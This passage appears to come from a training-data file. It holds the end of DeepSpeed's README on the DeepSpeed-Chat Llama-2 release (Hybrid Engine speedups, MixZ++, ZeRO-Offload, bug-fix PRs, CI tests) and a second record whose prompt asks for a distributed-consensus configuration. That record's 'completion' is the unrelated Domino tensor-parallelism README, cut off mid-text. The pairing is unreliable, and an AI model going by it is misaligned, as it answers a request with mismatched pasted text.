Scripts](https://github.com/deepspeedai/DeepSpeedExamples/tree/master/applications/DeepSpeed-Chat/training/step1_supervised_finetuning/training_scripts/llama2) |\n| 2 | [Llama-2 Step 2 Scripts](https://github.com/deepspeedai/DeepSpeedExamples/tree/master/applications/DeepSpeed-Chat/training/step2_reward_model_finetuning/training_scripts/llama2) |\n| 3 | [Llama-2 Step 3 Scripts](https://github.com/deepspeedai/DeepSpeedExamples/tree/master/applications/DeepSpeed-Chat/training/step3_rlhf_finetuning/training_scripts/llama2) |\n\n*Note*: While all the system aspects of Llama and Llama-2 support have been extensively tested, there are no guarantees about training convergence and may require hyper-parameter tuning to achieve convergence.\n\n## Performance Evaluation\n\nWe highlight the performance benefits of the Hybrid Engine for Llama-2 models on NVIDIA A100 and V100 GPUs in this section. Improved performance for larger models like Llama-2-70B and reduced resource requirements via ZeRO-Offload are discussed in the [next section](#new-features).\n\n#### A100 Performance Evaluation\nUsing A100 GPUs, we achieve 7.1x faster generation for Llama-2-7B and 5.4x faster generation for Llama-2-13B with DeepSpeed-Chat Hybrid Engine compared to DeepSpeed-Chat without Hybrid Engine (baseline) as shown in *Figure 1*.\n\n\n<div align=\"center\">\n  <img src=\"../assets/images/llama2-with-he.png\" alt=\"Up to 7.1x faster Llama-2 generation with DS-Chat Hybrid Engine\" width=\"600\"/>\n\n  *Figure 1: Up to 7.1x faster Llama-2 generation with DS-Chat Hybrid Engine*\n\n</div>\n\n#### V100 Performance Evaluation\nUsing V100 GPUs, we achieve 4x faster generation for Llama-2-7B and 2.1x faster generation for Llama-2-13B with DeepSpeed-Chat Hybrid Engine compared to DeepSpeed-Chat without Hybrid Engine (baseline) as shown in *Figure 2*.\n\n<div align=\"center\">\n  <img src=\"../assets/images/dschat-llama-7b-HE-perf.png\" alt=\"4x faster Llama-2-7B generation with DS-Chat Hybrid Engine\" width=\"400\"/>\n  <img src=\"../assets/images/dschat-llama-13b-HE-perf.png\" alt=\"2.1x faster Llama-2-13B generation with DS-Chat Hybrid Engine\" width=\"400\"/>\n\n  *Figure 2: [Left] 4x faster Llama-2-7B generation with DS-Chat Hybrid Engine (16 V100 GPUs) [Right] 2.1x faster Llama-2-13B generation with DS-Chat Hybrid Engine on 32 V100 GPUS vs. DS-Chat without Hybrid Engine on 16 V100 GPUs.*\n\n</div>\n\n\n# 3. Improved Efficiency and Accessibility <a name=\"new-features\"></a>\n\nWe now dive into the details of two new features we are introducing today: 1) Mixed Precision ZeRO++ (MixZ++) and 2) ZeRO-Offload. Both these features offer unique benefits for DeepSpeed-Chat users. MixZ++ provides up to 3.3x better throughput for LoRA-enabled training and ZeRO-Offload reduces the minimum number of GPUs required to train by up to 16x.\n\n## 3.3x Higher Throughput with MixZ++ for LoRA <a name=\"mixz\"></a>\n\nMixed Precision ZeRO++ ([MixZ++](https://github.com/deepspeedai/DeepSpeed/pull/3954)) is an extended set of optimization strategies built upon [ZeRO](https://www.deepspeed.ai/tutorials/zero/) and [ZeRO++](https://www.deepspeed.ai/tutorials/zeropp/) tailored to reduce memory usage and improve training/inference efficiency for RLHF training with LoRA.\n\nSimilar to [ZeRO](https://www.deepspeed.ai/tutorials/zero/), MixZ++ partitions model parameters across GPUs to reduce footprint and gathers them only when needed. In addition, similar to ZeRO++, MixZ++ allows for hierarchical partitioning and quantized communication. The hierarchical partitioning allows all the parameters to be stored within a node when possible so that the communication happens within a node, where communication bandwidth is significantly higher than communicating across nodes. The communication overhead is further reduced by quantizing the weights before gathering them.\n\nFinally, unlike ZeRO++ where parameters are always stored in fp16/bf16, and quantized/dequantized before and after communication, MixZ++ can persistently store the frozen weights in [Low-Rank Adaptation (LoRA)](https://github.com/deepspeedai/LoRA) in lower-precision, significantly reducing the communication overhead, eliminating quantization overhead, and supporting larger batch sizes that enable better efficiency.\n\nA comprehensive exploration of technical details can be accessed through our [ZeRO++ blog](https://www.microsoft.com/en-us/research/blog/deepspeed-zero-a-leap-in-speed-for-llm-and-chat-model-training-with-4x-less-communication/), [MixZ++ tutorial](https://www.deepspeed.ai/tutorials/mixed_precision_zeropp/), and [paper](https://arxiv.org/pdf/2306.10209.pdf).\n\n#### Highlights\n\nState-of-the-art approaches like [QLoRA](https://arxiv.org/abs/2305.14314) focus on combining multiple techniques like quantization of LoRA weights, relying on new datatypes such as NF4, and memory-management/offload techniques like paged optimizers to enable finetuning of large models on a single GPU. MixZ++ is our approach to enable large model training powered by quantization but is designed to scale to a large number of GPUs with simplicity and compatibility with existing technologies like ZeRO-Offload and DeepSpeed Hybrid Engine.\n\nMixZ++ has the following highlights:\n- Simplicity: A general solution requiring no assumptions about the model and/or optimizer. Integrating it into your training script is as simple as adding a single line of code.\n- Performance: Powered by a set of highly optimized CUDA kernels that enables efficient quantization/dequantization. The evaluation shows up to 3.3x higher throughput for Llama-2-70B training on 128 GPUs compared to the ZeRO-3 baseline (*Figure 3*).\n- Compatibility: Compatible with DeepSpeed/ZeRO features like DeepSpeed Hybrid Engine, ZeRO-Offload, etc.\n- Scalability: Designed to scale to a large number of GPUs. It is tested on up to 384 GPUs on Azure.\n\n\n#### Performance Evaluation\nTo assess the effectiveness of MixZ++ for LoRA-enabled training, we carried out a series of RLHF training experiments (Step 3) using the Llama-2-70B model. These experiments were conducted on hardware configurations featuring 64 and 128 V100 GPUs. A visual representation of the experiment results is shown in the following figure:\n\n<div align=\"center\">\n  <img src=\"../assets/images/dschat-mpzero-llama.png\" alt=\"Mixed Precision ZeRO++ Evaluation\" width=\"600\"/>\n\n  *Figure 3: We achieve 3.3x increased throughput for RLHF training of Llama-2-70B on 128 V100 GPUs using Mixed Precision ZeRO++ vs. ZeRO-3. We obsvered 2x improved throughout for the same experiment on 64 V100 GPUs.*\n\n</div>\n\nSpecifically, our results showcase a 2x increase in training throughput when utilizing 64 GPUs with MixZ++, compared to the ZeRO-3 baseline. Furthermore, when scaling up to 128 GPUs, the speedup effect becomes even more pronounced, with a substantial 3.3x improvement in training throughput. These outcomes underscore the potential of MixZ++ as a powerful tool for improving training efficiency in large-scale GPU settings.\n\nTo try this feature, please refer to [MixZ++ tutorial](https://www.deepspeed.ai/tutorials/mixed_precision_zeropp/).\n\n## ZeRO-Offload Support for Larger Models with 16x fewer GPUs <a name=\"zero-offload\"></a>\n\n[ZeRO-Offload](https://www.microsoft.com/en-us/research/blog/zero-infinity-and-deepspeed-unlocking-unprecedented-model-scale-for-deep-learning-training/) powers unprecedented model sizes by leveraging the full memory capacity of a system, concurrently exploiting all heterogeneous memory. Modern GPU clusters have 2-3x more CPU memory than GPU memory. ZeRO-Offload capitalizes on this disparity and offloads optimizer memory and computation from the GPU to the host CPU, enabling larger models to be trained with fewer GPU resources without being bottlenecked by the CPU's lower bandwidth. ZeRO-Offload allows training of large models on up to 16x fewer GPUs as we can see in *Figure 4*.\n\n<div align=\"center\">\n  <img src=\"../assets/images/ds_chat_zero_offload_gpu.png\" width=\"600\">\n\n  *Figure 4: ZeRO-Offload enables us to train Llama-2-7B with 16x fewer GPUs. 16 V100 GPUs are required for training Llama-2-7B with DS-Chat ZeRO-3. Enabling LoRA allows for the number of GPUs to be reduced to 4 while enabling ZeRO-Offload reduces the number of needed GPUs to 1. The HuggingFace Baseline does not run due to memory limitations.*\n\n</div>\n\nZeRO-Offload was [disabled](https://github.com/deepspeedai/DeepSpeedExamples/pull/553)\n with the initial release of DeepSpeed-Chat due to training instability that was observed when it was used with Hybrid Engine and LoRA. After improvements to Hybrid Engine and LoRA as well as extensive testing of all feature configurations for ZeRO Stage2 and ZeRO Stage 3, this feature can now be enabled across all three steps of the DeepSpeed-Chat training framework. Please note that configuring ZeRO-Offload with ZeRO Stage 2 and Hybrid Engine with LoRA disabled is currently unsupported due to observed training instability.\n\n<div align=\"center\">\n  <img src=\"../assets/images/zero_offload_after_stability.png\" width=\"750\">\n\n  *Figure 5: Reward scores for all supported DeepSpeed-Chat configurations with ZeRO-Offload enabled. Run with 16 V100 GPUs, [AdamG012/chat-opt-1.3b-sft-deepspeed](https://huggingface.co/AdamG012/chat-opt-1.3b-sft-deepspeed) actor model, [AdamG012/chat-opt-350m-reward-deepspeed](https://huggingface.co/AdamG012/chat-opt-350m-reward-deepspeed) critic model, DS commit: [f036f00c](https://github.com/deepspeedai/DeepSpeed/tree/f036f00c3763694e539a9070a98130e2667e49bd), DSE commit: [81a8521f](https://github.com/deepspeedai/DeepSpeedExamples/tree/81a8521f05e2761eed34fcf65f19873df9f74403).*\n\n</div>\n\n# 4. Stability Bug Fixes <a name=\"stability-bug-fixes\"></a>\n\nA wide range of issues have been addressed in the DeepSpeed runtime and the DeepSpeed-Chat pipeline. These fixes enable advanced features such as Hybrid Engine, LoRA, and ZeRO-Offload to run across all training steps of the DeepSpeed-Chat pipeline and improve training stability and convergence.\n\n<div align=\"center\">\n  <img src=\"../assets/images/ds_chat_stability_sweep.png\" width=\"750\">\n\n  *Figure 6: Step 3 Reward Scores for all supported DeepSpeed-Chat configurations. Run with 16 V100 GPUs, [AdamG012/chat-opt-1.3b-sft-deepspeed](https://huggingface.co/AdamG012/chat-opt-1.3b-sft-deepspeed) actor model, [AdamG012/chat-opt-350m-reward-deepspeed](https://huggingface.co/AdamG012/chat-opt-350m-reward-deepspeed) critic model, DS commit: [f036f00c](https://github.com/deepspeedai/DeepSpeed/tree/f036f00c3763694e539a9070a98130e2667e49bd), DSE commit: [81a8521f](https://github.com/deepspeedai/DeepSpeedExamples/tree/81a8521f05e2761eed34fcf65f19873df9f74403).*\n\n</div>\n\n*Figure 6* above shows the training convergence across all supported DeepSpeed-Chat configurations. This data was collected using 16 V100 NVIDIA GPUs, the [AdamG012/chat-opt-1.3b-sft-deepspeed](https://huggingface.co/AdamG012/chat-opt-1.3b-sft-deepspeed) OPT model as the actor, the [AdamG012/chat-opt-350m-reward-deepspeed](https://huggingface.co/AdamG012/chat-opt-350m-reward-deepspeed) OPT model as the critic, and the following DeepSpeed and DeepSpeedExamples repository commits: DS commit: [f036f00c](https://github.com/deepspeedai/DeepSpeed/tree/f036f00c3763694e539a9070a98130e2667e49bd), DSE commit: [81a8521f](https://github.com/deepspeedai/DeepSpeedExamples/tree/81a8521f05e2761eed34fcf65f19873df9f74403).\n\nWe now dive into the details of all the fixes across different areas.\n\n## DeepSpeed-Chat Pipeline Fixes\n\nIn this section we discuss the functionality and training stability fixes in the DeepSpeed-Chat pipeline.\n\n- **Training Stability:**\n\n  - [PR #620 - Make training more stable](https://github.com/deepspeedai/DeepSpeedExamples/pull/620)\n\n    - To improve the training stability in Step 3, several different areas of training were tuned and changed. To start, the Kullback-Liebler (KL) divergence used in the Proximal Policy Optimization (PPO) trainer was slightly tuned to reduce divergence between the new and reference policies and improve the reward score. Next, the sequence generation function in the PPO trainer (`_generate_sequence()`) removed the specification of a `min_length` in the Actor model's `generate()` call, which means generated sequences won't be artificially enlarged, allowing for the possibility of sequence generation to collapse i.e. when training convergence is extremely poor. A minor off-by-one error was also fixed in the PPO trainer's reward computation function (`compute_rewards()`). Finally, the PPO trainer's RLHF training function was updated to zero out the reward and value after the end of a conversation to prevent incorrect `advantages` and `returns`.\n\n  - [PR #633 - DS Chat Step 3 - Add separate Lora Adam optimizer group](https://github.com/deepspeedai/DeepSpeedExamples/pull/633)\n\n    - The [LoRA](https://github.com/deepspeedai/LoRA) feature is supported across all three training steps of the DeepSpeed-Chat framework. Prior to this stability effort, there was no distinction between the overall learning rate and the LoRA learning rate i.e. the LoRA learning rate was set to whatever the overall learning rate was. This led to instability in training convergence and can be seen in *Figure 7* below showing the reward score across training steps for various Step 3 configurations:\n\n      <div align=\"center\">\n        <img src=\"../assets/images/sweep_before_lora_fix.png\" width=\"650\">\n\n        *Figure 7: Before the fix, the sweep across all ZeRO-2 cases without a separate LoRA learning rate shows training instability when LoRA is used.*\n\n      </div>\n\n      To address this training convergence issue, when creating the optimizer grouped parameters, the LoRA `lora_right_weight` and `lora_left_weight` parameters were explicitly separated out and given their own LoRA-specific learning rate. After this change, a dramatic improvement in stability was observed, as shown in the figure below:\n\n      <div align=\"center\">\n        <img src=\"../assets/images/sweep_after_lora_fix.png\" width=\"650\">\n\n        *Figure 8: After creating a separate LoRA learning rate, the sweep across all ZeRO-2 cases shows proper convergence.*\n\n      </div>\n\n      The next fix details the addition of separate LoRA learning rate arguments.\n\n  - [PR ##685 Add LoRA LR for DS Chat steps 1-3](https://github.com/deepspeedai/DeepSpeedExamples/pull/685)\n\n    - A *separate* LoRA learning rate argument can now be provided in each of the three training steps, with Step 3 having individual LoRA learning rates for the Actor and Critic models.\n\n- **Bug Fixes:**\n\n  - [PR #636 - DS Chat Step 3 - Fix Zero Stage 3](https://github.com/deepspeedai/DeepSpeedExamples/pull/636)\n\n      - During DeepSpeed-Chat Step 3 training, we observed hangs when ZeRO Stage 3 was enabled for the actor model and when the `world_size > 1`. When observing the state of each rank, one rank would still be in the sequence generation phase `self._generate_sequence()`, while the other rank had already progressed to the `self.actor_model()` call. This ZeRO Stage 3 desynchronization, due to misaligned token generation between the GPUs, can normally be automatically detected and accounted for in the HuggingFace Transformers library via `synced_gpus`. However, due to the nature of the DeepSpeed-Chat pipeline and the lifetime of the corresponding model configuration objects, this automatic detection code was not triggered. To resolve this, when invoking the `generate()` function, the `synced_gpus` argument is explicitly passed and set to `True` when ZeRO Stage 3 is being used.\n\n  - [PR #658 - Fix only optimize lora and ack-ckpting compatible](https://github.com/deepspeedai/DeepSpeedExamples/pull/658)\n\n    - This fix allows Step 3 training to run with the combination of gradient checkpointing and *LoRA-only* parameter optimization, a previously unsupported training case. With the addition of the [enable_input_require_grads](https://github.com/huggingface/transformers/blob/f26099e7b5cf579f99a42bab6ddd371bf2c8d548/src/transformers/modeling_utils.py#L1225) model utility function in the HuggingFace Transformers library, which enables the gradients for the input embeddings, gradient checkpointing and optimization of *only* the LoRA parameters is made possible.\n\n  - [PR #576 - Fix argparse](https://github.com/deepspeedai/DeepSpeedExamples/pull/576)\n\n    - An external contributor helped in resolving an argument parsing issue.\n\n  - [PR #584 - Fix unused parameter bug](https://github.com/deepspeedai/DeepSpeedExamples/pull/584)\n\n    - An external contributor fixed the passing of an uninitialized parameter that was hardcoded earlier.\n\n\n## Hybrid Engine Fixes\nIn this section we discuss several fixes in the Hybrid Engine.\n\n- [PR #3563 - Fix LoRA Fuse/Unfuse in Hybrid Engine](https://github.com/deepspeedai/DeepSpeed/pull/3563)\n\n  - During Step 3 training for OPT with LoRA and Hybrid Engine enabled, an issue arose regarding a tensor size mismatch of the LoRA weights. Specifically, the LoRA QKV weights were not fused in the OPT container policy, yet they were expected to be fused by the Hybrid Engine. This challenge was effectively resolved by introducing both fused and unfused LoRA methods in the Hybrid Engine. We thank @sxjscience for providing this fix.\n\n- [PR #3883 - Extend HE-Lora test with Z3 support + Fix/add guard in HE for Z3](https://github.com/deepspeedai/DeepSpeed/pull/3883)\n\n  - The Hybrid Engine was updated to properly check whether ZeRO Stage 3 was enabled when resetting the inference container parameters, along with expanding the corresponding unit tests.\n\n\n## ZeRO Stage 3 Fixes\nIn this section we discuss several fixes in support of the ZeRO Stage 3 feature.\n\n- [PR #3819 - Fix racing condition in GatheredParameters](https://github.com/deepspeedai/DeepSpeed/pull/3819)\n\n  - A race condition in the the ZeRO `GatheredParameters` context, which resulted in various `'status': 'INFLIGHT'` issues, was fixed by removing duplicate input parameters that were being passed from the Hybrid Engine.\n\n- [PR #3884 - Separate ZeRO3 InflightParamRegistry for train and eval](https://github.com/deepspeedai/DeepSpeed/pull/3884)\n\n  - The ZeRO Stage 3 `InflightParamRegistry` was updated to use a separate `InflightParamRegistry` for training and evaluation, fixing an issue where leftover parameters in flight were causing inflight parameter errors. These fixes, along with related fixes in the Hybrid Engine, enabled the use of the ZeRO-Offload feature in the DeepSpeed-Chat training pipeline.\n\n- [PR #3928 - Remove the param.ds_tensor from print](https://github.com/deepspeedai/DeepSpeed/pull/3928)\n\n  - A minor change that was necessary to address the DeepSpeed-Chat Step 3 hang issue ([PR #636](https://github.com/deepspeedai/DeepSpeedExamples/pull/636)) as it allowed us to progress further into execution and observe the desynchronization point.\n\n\n# 5. Software Improvements <a name=\"software-improvements\"></a>\n\nTo improve the characterization, ease of debug, and maintainability of the DeepSpeed-Chat framework, several areas of software improvements have been completed. Characterization scripts were added to enable systematic composition of features, instrumentation was added to improve insight into the behavior of training, and a testing CI workflow was added to improve the maintainability of the DeepSpeed-Chat training framework.\n\n## Characterization Scripts\n\nThe DeepSpeed-Chat training framework provides a rich set of features (Hybrid Engine, ZeRO, LoRA, etc.) that can be composed in many different combinations, depending on the scenario. The interactions between the features are often complex and composing them in a systematic way for characterization is useful for understanding their behavior. To support such use cases, characterization scripts have been added to run sweeps of Steps 1, 2, and 3 training for various combinations of features. The scripts default to OPT but can be modified to run with Llama. Please see the READMEs in the following folders for more details:\n\n- [Step 1 Sweep Scripts](https://github.com/deepspeedai/DeepSpeedExamples/tree/master/applications/DeepSpeed-Chat/training/step1_supervised_finetuning/training_scripts/opt/single_node/sweep)\n- [Step 2 Sweep Scripts](https://github.com/deepspeedai/DeepSpeedExamples/tree/master/applications/DeepSpeed-Chat/training/step2_reward_model_finetuning/training_scripts/opt/single_node/sweep)\n- [Step 3 Sweep Scripts](https://github.com/deepspeedai/DeepSpeedExamples/tree/master/applications/DeepSpeed-Chat/training/step3_rlhf_finetuning/training_scripts/opt/single_node/sweep)\n\nFor example, the Step 3 characterization script sweeps across various training features:\n| Feature | Values |\n| --- | --- |\n| ZeRO Stage | 2, 3 |\n| Hybrid Engine | True, False |\n| ZeRO-Offload | True, False |\n| LoRA | True, False |\n\nAnd can be ran as follows:\n\n<pre>\nDeepSpeedExamples/applications/DeepSpeed-Chat/training/step3_rlhf_finetuning$ bash training_scripts/opt/single_node/sweep/run_step3_sweep.sh\n</pre>\n\nThe training log for each combination of features will be stored in a folder with the name formatted as `z${z}_he_${he}_offload_${offload}_lora_${lora}`\n\n\nRelated PRs:\n\n- [DS Chat Characterization Scripts (Step 1 and 3)](https://github.com/deepspeedai/DeepSpeedExamples/pull/638)\n- [Add step 2 sweep script, clean up scripts](https://github.com/deepspeedai/DeepSpeedExamples/pull/664)\n- [Update script location and docs for all 3 steps](https://github.com/deepspeedai/DeepSpeedExamples/pull/681)\n\n## Instrumentation\n\nTo gain better insight into DeepSpeed-Chat training, new [instrumentation features](https://github.com/deepspeedai/DeepSpeedExamples/pull/624) were added across all three steps of DeepSpeed-Chat and can be enabled via arguments to each step's `main.py`.\n\n| Argument | Description | Step(s) |\n| --- | --- | --- |\n| --print_loss         | Print loss during each step                                                     | 1     |\n| --enable_tensorboard | Enable TensorBoard logging at the model Runtime Engine level                    | 1,2,3 |\n|                      | Enable TensorBoard logging at the Training Pipeline level                       | 3     |\n| --tensorboard_path   | Path to write TensorBoard log                                                   | 1,2,3 |\n| --print_answers      | Print actor model prompt and answers during training across all ranks           | 3     |\n\n\n### TensorBoard\nTensorBoard logging can be enabled in each of the three training steps, with some slight nuances in Step 3. To start, for each training step, the `enable_tensorboard` argument can be used to enable a TensorBoard monitor at the Runtime Engine level ([see documentation](https://www.deepspeed.ai/docs/config-json/#monitoring-module-tensorboard-wandb-csv)) and is reflected in the corresponding model training configuration:\n```python\n\"tensorboard\": {\n    \"enabled\": enable_tensorboard,\n    \"output_path\": f\"{tb_path}/ds_tensorboard_logs/\",\n    \"job_name\": f\"{tb_name}_tensorboard\"\n}\n```\n\n- **Step 3**:\n    Due to Step 3 initializing both an Actor and a Critic model, _each_ of the models will have their own corresponding TensorBoard monitor at the Runtime Engine level. Beyond that, Step 3 training also contains a Pipeline-level TensorBoard monitor a level above the model runtime engines, which captures the `reward`, `actor_loss`, `actor_loss_sum`, `critic_loss`, and `critic_loss_sum`.\n\n## Testing\n\nAs part of the DeepSpeed team's commitment to maintaining the DeepSpeed-Chat training framework, continuous integration [PyTest](https://github.com/deepspeedai/DeepSpeedExamples/blob/master/applications/DeepSpeed-Chat/training/tests/test_training.py) testing has been added for Step 3 RLHF training in a new [GitHub Actions workflow](https://github.com/deepspeedai/DeepSpeed/actions/workflows/nv-ds-chat.yml).\n\n| Description | Status |\n| ----------- | ------ |\n| Integrations | [![nv-ds-chat](https://github.com/deepspeedai/DeepSpeed/actions/workflows/nv-ds-chat.yml/badge.svg?branch=master)](https://github.com/deepspeedai/DeepSpeed/actions/workflows/nv-ds-chat.yml) |\n\n The workflow is run on a **nightly** basis across a **16-case** test matrix (see table below), and uses the **facebook/opt-125m** model for both the actor and critic.\n\n| Parameter | Values |\n| --- | --- |\n| ZeRO Stage    | 2, 3        |\n| Hybrid Engine | True, False |\n| ZeRO-Offload  | True, False |\n| LoRA          | True, False |\n\nEach configuration (16 total) runs through a limited number of Step 3 non-overflow training steps (i.e. steps where neither actor nor critic overflow) and saves the actor/critic models. Assertions are used to check if the training pipeline executed correctly and if the actor and critic models were saved properly.\n\n# 6. Try Out DeepSpeed-Chat <a name=\"try-out-deepspeed-chat\"></a>\nWe are very excited to share this DeepSpeed-Chat feature and stability release.\n\n* To get started, please visit our GitHub page for DeepSpeed-Chat: [GitHub Landing Page](https://github.com/deepspeedai/DeepSpeedExamples/tree/master/applications/DeepSpeed-Chat)\n\n* We will continue to improve DeepSpeed-Chat with your feedback and support. Our [roadmap](https://github.com/deepspeedai/DeepSpeedExamples/tree/master/applications/DeepSpeed-Chat/README.md#-deepspeed-chats-roadmap-) shows currently supported features as well as ones that are planned for future.\n\nDeepSpeed-Chat is part of the bigger DeepSpeed ecosystem comprising of a multitude of Deep Learning systems and modeling technologies. To learn more,\n\n* Please visit our [website](https://www.deepspeed.ai/) for detailed blog posts, tutorials, and helpful documentation.\n* You can also follow us on our [English Twitter](https://twitter.com/DeepSpeedAI), [Japanese Twitter](https://twitter.com/DeepSpeedAI_JP), and [Chinese Zhihu](https://www.zhihu.com/people/deepspeed) for latest news on DeepSpeed.\n\nDeepSpeed welcomes your contributions! We encourage you to report issues, contribute PRs, and join discussions on the [DeepSpeed GitHub](https://github.com/deepspeedai/DeepSpeed/) page. Please see our [contributing guide](https://github.com/deepspeedai/DeepSpeed/blob/master/CONTRIBUTING.md) for more details. We are open to collaborations with universities, research labs, companies, such as those working together on deep learning research, applying DeepSpeed to empower real-world AI models and applications, and so on. For such requests (and other requests unsuitable for GitHub), please directly email to deepspeed-info@microsoft.com.\n\n* \"Star\" our [DeepSpeed GitHub](https://github.com/deepspeedai/DeepSpeed/) and [DeepSpeedExamples GitHub](https://github.com/deepspeedai/DeepSpeedExamples/) repositories if you like our work!\n", "metadata": {"source": "github.com/deepspeedai/DeepSpeed", "file_path": "blogs/deepspeed-chat/ds-chat-release-8-31/README.md", "language": "markdown", "complexity": "complex", "star_count": 39501, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": true, "line_count": 353}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "<p align=\"center\">\n  <img  width=\"300\" height=\"300\" src=\"./images/domino-logo.png\" alt=\"domino logo\"/>\n</p>\n\n<div align=\"center\">\n\n# Domino: Communication-Free LLM Training Engine\n\n</div>\n\n<div align=\"center\">\n  <img src=\"./images/domino-hero.png\" alt=\"\" width=\"1200\" />\n\n<div align=\"left\">\n\n*Figure 1: Project Domino is Microsoft DeepSpeed's Tensor Parallel (TP) Training Engine, which provides a uniform solution for both single-node and **multi-node** cases. Domino scales up traditional single-node-only TP solution to multi-node environments via **near-complete communication hiding** behind computation.*\n\n</div>\n</div><br>\n\n# Table of Content\n1. [Introduction](#introduction)\n2. [Domino Highlights](#domino-highlights)\n3. [Design Motivation](#design-motivation)\n4. [Domino Design](#domino-design)\n5. [Implementation and Optimization](#implementation-and-optimization)\n6. [Getting Started: Try out DeepSpeed-Domino](#getting-started-try-out-deepspeed-domino)\n7. [Citation](#citation)\n8. [Acknowledgements](#acknowledgements)\n\n\n# Introduction\n\nGenerative AI (GenAI) has enabled transformative applications in a wide variety of domains, including chatbot, text summarization, and high-quality image and video generation. These capabilities are built on top of large foundation models, particularly Large Language Models (LLMs). LLMs are typically based on the [Transformer](https://arxiv.org/abs/1706.03762) network architecture, and include popular model families such as GPT and Llama. LLMs have grown beyond the memory capacity of a single accelerator (e.g., GPU), and so inferencing or training them requires distributed processing using multiple GPUs or even multiple nodes.\n\nTensor parallelism (TP) is a popular distributed technique for training LLMs. TP leverages the aggregate memory of multiple GPUs to fit LLMs by partitioning each model layer across the GPUs. However, TP incurs two communication collective operations for each partitioned layer, separately for the forward and backward passes. TP is appealing due to its excellent system efficiency in single-node cases, where GPUs are directly connected via high bandwidth links like NVLink and NVSwitch. However, TP falls short in multi-node cases due to the lower bandwidth of cross-node interconnects. [Prior work](https://arxiv.org/abs/2406.06858) reports that communication can take up to 75\\% of end-to-end training time. Figure 2 shows that even on the latest DGX-H100 nodes interconnected with high-end Infiniband of 400GB/s bandwidth, communication overheads remains as high as 43\\% of end-to-end training iteration time. Recent advances in GeMM+NCCL kernel fusion are unable to fully hide communication overheads due to their limited scope of computation-communication overlapping. The trend of faster compute in newer GPUs (e.g., DGX-B200) indicates that the communication overheads of TP will be more pronounced in both single node and multiple node scenarios.\n\n<div align=\"center\">\n  <img src=\"./images/gpt3-scale.png\" width=\"400\"><br>\n\n  *Figure 2: TP communication overhead in GPT-3-13B training using 1,2,4 DGX-H100 nodes (i.e., 8, 16, 32 H100 GPUs).*\n\n</div>\n\n# Domino Highlights\n\n\n* Domino is TP optimization technique that achieves **Near-Complete** communication hiding behind computation by decomposing a single batch training iteration into smaller and independent pieces, allowing efficient pipelining.\n\nDomino is the first work that provides a **uniform** Tensor Parallelism (TP) solution for both single-node and **multi-node** cases. Traditional TP solutions (e.g., Megatron-LM) fall short in multi-node cases due to limited cross-node communication bandwidth.\n\n### Performance\n\nWe tested Domino on 1 to 4 DGX-H100 boxes (8xH100 per box). Each node has intra-node NVLink bandwidth of 900GB/s and inter-node IB bandwidth of 400GB/s. We oberved the following performance results:\n1. For both GPT and Llama model series, Domino outperforms Megatron-LM by up to **1.3x** and **1.2x** respectively in end-to-end training iteration throughput for different model sizes, sequence lengths and batch sizes. These results are summarized in Figure 1.\n2. For several cases, Domino achieves **near-optimal** training throughput, where optimal throughput refers to the throughput achieved assuming the communication collectives of TP are disabled.\n\nFor more detailed performance results, please refer to our [arxiv paper](https://arxiv.org/abs/2409.15241).\n\n# Design Motivation\n\nIn this section, we briefly discuss three topics. First, we motivate why the time is right is for a uniform TP solution for both single node and multi-node cases. Next, we analyze the communication overhead on latest Nvidia DGX-H100 boxes with high cross-node communication interconnects. Finally, we describe TP's sequential data dependency which causing communication stands out.\n\n### It is time for a uniform TP for single and multi-node scenarios\n\nNvidia is pushing hard on breaking communication bandwidth gap between intra-node (i.e., GPUs within a node connected with NVLink) and inter-node (i.e., cross-node connected with Infini-Band(IB)). For example, each DGX-H100 is equipped with eight ConnectX-7 network cards and gets aggregated cross-node bandwidth of 400GB/s, which is at same level of intra-node NVLink (900GB/s). Therefore, it is time for proposing a uniform solution for both single node and multi-node TP training.\n\n### Communication Overhead in TP\n\nAs described in [Megatron-LM paper](https://arxiv.org/pdf/1909.08053), for TP, every transformer block (i.e.,1 Self-Attention layer + 1 MLP layer) incurs 4 AllReduce calls, two in forward pass and two in the backward pass (shown in Figure 3). Given a LLM consisting of $N$ stacked transformer blocks, the number of AllReduce calls required for TP training is $4 * N$. Even for small models like GPT-3 2.7B or 6.7B which consists of 32 layers, the total number of AllReduce calls is 128 for every training iteration. For larger models, the number of AllReduce calls grows linearly with number of layers.\n\n<div align=\"center\">\n  <img src=\"./images/tp-ar.png\" width=\"500\"><br>\n\n  *Figure 3: TP communication = 4 x AllReduce x num\\_transformer\\_block*\n\n</div>\n\nOne big issue for TP is that the *communication resides on critical path of every input batch training execution* due to sequential data dependency we described in the following [TP data dependency analysis](#tp-data-dependency-analysis) section. Therefore, the communication overhead stands out and is difficult to hide behind computation. In Figure 4, we provide our communication overhead measurement using Megatron-LM training GPT-3 and Llama-2 model series with different model sizes and batch sizes across 1 to 4 DGX-H100 nodes (i.e., 8 to 32 H100 GPUs). The communication overhead is up to **47\\%** despite using latest Nvidia hardware DGX-H100 with 400GB/s cross-node bandwidth.\n\n<div align=\"center\">\n  <img src=\"./images/tp-comm-overhead.png\" width=\"600\"><br>\n\n  *Figure 4: TP communication and computation ratio per training iteration time over different models and batch sizes using 1 to 4 DGX-H100 nodes.*\n\n</div>\n\nAs Llama-3 405B model training takes 54 days on 16,000 H100 GPUs, the projected communication time can be up to around **25 days on 16,000 H100s**. This finding shows that, despite using latest high-bandwidth interconnects like NVLink/Infini-Band(IB), the communication overheads of TP remains a huge portion of end-to-end training time.\n\n### TP data dependency analysis\n\nIn traditional TP, shown in Figure 5, a transformer layer (either Attn or MLP layer) computation can be abstracted into $X\\*A\\*B=Y$, where $X$ is input. For attention layer, $A$ is attention computation (e.g., multihead-attention) and $B$ is linear layer. For MLP layer, both $A$ and $B$ are linear layers. An AllReduce is conducted on $Y$ after computation. Due to **sequential data dependency on $Y$ between computation (i.e., $X\\*A\\*B=Y$) and communication (i.e., AllReduce($Y$)), AllReduce($Y$) completely stands out**, thus making TP not efficient in limited communication bandwidth scenarios.\n\n<div align=\"center\">\n  <img src=\"./images/design-base.png\" 